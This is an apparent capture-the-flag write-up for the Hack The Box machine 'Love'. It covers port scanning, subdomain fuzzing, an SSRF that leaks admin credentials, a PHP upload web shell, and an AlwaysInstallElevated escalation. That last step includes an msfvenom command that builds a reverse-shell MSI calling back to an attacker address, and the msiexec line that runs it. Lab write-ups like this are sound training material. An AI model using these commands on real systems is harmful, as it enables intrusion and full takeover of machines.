---
title: HTB Love
author: kei5uke
draft: false
description: Writeup for HTB Love
tags:
  - windows
  - writeup
---
# Enumeration
```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:     bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1:   83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_SHA-256: ee6b 72d6 0b18 4154 b032 dda0 c62a a401 8456 76dd 0126 1f9d 2d97 26ac 0f59 a74e
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/wsmans?
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: 2026-10-19T14:19:50+00:00; +21m32s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:     d35a 2ba6 8ef4 7568 f99d d6f4 aaa2 03b5
| SHA-1:   84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
|_SHA-256: da33 6d66 634e 87fc 706c c980 c148 ab23 dfe1 1c81 483a 2192 e366 582d e517 da6c
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

```
# Services
### HTTP 80
Browsing to the IP directly doesn't work, so the site expects a hostname.
![[Screenshot 2026-10-19 at 22.12.49.png]]
```bash
feroxbuster --url http://staging.love.htb --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/combined_directories.txt -x php 
	


ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.love.htb" -u http://staging.love.htb -fw 654 -mc all

staging
```

Subdomain enumeration reveals the `staging` subdomain.

![[Screenshot 2026-10-22 at 16.10.32.png]]
The staging site has a demo page vulnerable to SSRF. Pointing it at `localhost:5000` returns the credentials served there.

Credentials recovered — `admin : @LoveIsInTheAir!!!!`
### HTTP 443
![[Screenshot 2026-10-19 at 22.14.01.png]]

### SMB 139
```bash
smbclient -L //10.129.48.103 -U anonymous                          
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbclient -L //10.129.48.103 -U administrator                      
Password for [WORKGROUP\administrator]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

### HTTP 5000
![[Screenshot 2026-10-19 at 22.20.40.png]]

### ssl/wsmans? 5986
Not plain HTTP.
```bash
nc 10.129.48.193 5986                                                      
(UNKNOWN) [10.129.48.193] 5986 (?) : No route to host
```
# Shell
Logging in to the admin panel with the recovered credentials gives access to a file upload that accepts PHP, leading to a web shell as `Phoebe`.
![[Screenshot 2026-10-22 at 17.02.13.png]]

The PowerShell history hints at a privilege escalation path:
```bash

C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

�����͹ Checking AlwaysInstallElevated (T1548.002)                                                                                                                                           
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated                                                                    
    AlwaysInstallElevated set to 1 in HKLM!                                                                                                                                                 
    AlwaysInstallElevated set to 1 in HKCU!
```

`AlwaysInstallElevated` being set means any MSI package installs with SYSTEM privileges, so a malicious MSI gives a shell as Administrator.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.41 LPORT=443 -f msi -o reverse.msi
```

```bash
C:\Users\Phoebe\Downloads>msiexec /quiet /qn /i C:\Users\Phoebe\Downloads\reverse.msi

```
This runs the installer silently and fires back a reverse shell as `NT AUTHORITY\SYSTEM`.
![[Screenshot 2026-10-22 at 17.42.08.png]]